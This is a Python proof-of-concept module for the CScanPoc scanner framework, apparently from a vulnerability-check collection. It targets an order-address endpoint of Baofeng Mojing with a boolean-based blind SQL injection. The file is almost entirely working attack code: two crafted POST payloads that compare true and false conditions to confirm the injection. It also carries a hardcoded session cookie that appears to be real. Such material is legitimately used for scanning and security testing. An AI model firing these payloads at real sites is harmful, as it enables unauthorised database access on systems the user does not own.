# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Mojing_0111' # 平台漏洞编号
    name = '暴风魔镜订单SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-18'  # 漏洞公布时间
    desc = '''模版漏洞描述
    暴风魔镜订单SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=204847
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mojing'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2df88c7b-12ec-4345-9578-04f2723d6daf' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-27' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/order/user/myaddressdelete"
            payload = "address_id=(SELECT (CASE WHEN (996=996) THEN 8966 ELSE 8966*(SELECT 8966 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&is_order_page=is_myaddress_page&dis_address_id=49152"
            payload1 = "address_id=(SELECT (CASE WHEN (996=997) THEN 8966 ELSE 8966*(SELECT 8966 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&is_order_page=is_myaddress_page&dis_address_id=49152"
            headers = {
                "Proxy-Connection": "keep-alive",
                "Content-Length": "69",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "Accept-Encoding": "gzip,deflate",
                "Accept-Language": "zh-CN,zh;q=0.8",
                "Cookie": "user_regist_plat=2; pi=3966367904827989; piv=b68fcaa79d56829d608e84397eb2c41b; PHPSESSID=d6i7vdovv9c9agun1n9g6p9vj7; rf_f=http%3A%2F%2Ftools.phpinfo.me%2Fdomain%2F; nTalk_CACHE_DATA={uid:kf_9686_ISME9754_3966367904827989,tid:1461333571118043}; NTKF_T2D_CLIENTID=guest5B5D7286-B43B-47B2-362E-32AD63DC61C9; _yd_=GA1.2.1561271614.1461333586; Hm_lvt_cc8bbd8fb148ffc25a2c9c951dd43040=1461150226,1461151868,1461333571,1461341340; Hm_lpvt_cc8bbd8fb148ffc25a2c9c951dd43040=1461341385; __visitid=d90fd5493a3d98c48a400498dbd94634#177"
            }
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url,data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
